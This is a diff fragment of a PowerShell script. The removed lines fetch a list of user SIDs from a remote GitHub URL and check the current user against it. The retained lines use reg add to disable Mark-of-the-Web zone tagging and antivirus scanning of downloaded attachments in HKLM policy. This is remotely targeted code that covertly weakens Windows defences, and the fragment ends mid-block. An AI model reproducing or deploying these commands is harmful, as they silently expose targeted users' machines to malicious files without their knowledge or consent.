@@ -1,44 +1,4 @@
-# Define the URL containing the SID list
-$sidUrl = "https://raw.githubusercontent.com/boradxshlok/AAOGL/refs/heads/main/a..o..g..l.txt"
 
-# Initialize variables
-$urlSids = @()
-$systemSid = $null
-
-# Fetch the SID list from the URL
-try {
-    $webClient = New-Object System.Net.WebClient
-    $urlContent = $webClient.DownloadString($sidUrl)
-    $urlSids = $urlContent -split '\r?\n' | ForEach-Object {
-        $sid = ($_.Split('#')[0]).Trim()
-        if ($sid -match '^S-1-[0-9-]+$') {
-            $sid
-        }
-    }
-}
-catch {
-    $urlSids = @()
-}
-finally {
-    if ($webClient) { $webClient.Dispose() }
-}
-
-# Get the current user's SID
-try {
-    $whoamiOutput = whoami /user
-    $systemSid = ($whoamiOutput | Select-String -Pattern "S-1-[0-9-]+").Matches.Value.Trim()
-    if (-not ($systemSid -match '^S-1-[0-9-]+$')) {
-        exit
-    }
-}
-catch {
-    exit
-}
-
-# Compare the SIDs
-if ($urlSids -and $systemSid) {
-    if ($urlSids -contains $systemSid) {
-        # Set registry keys
         try {
             reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v SaveZoneInformation /t REG_DWORD /d 0 /f | Out-Null
             reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v ScanWithAntiVirus /t REG_DWORD /d 0 /f | Out-Null
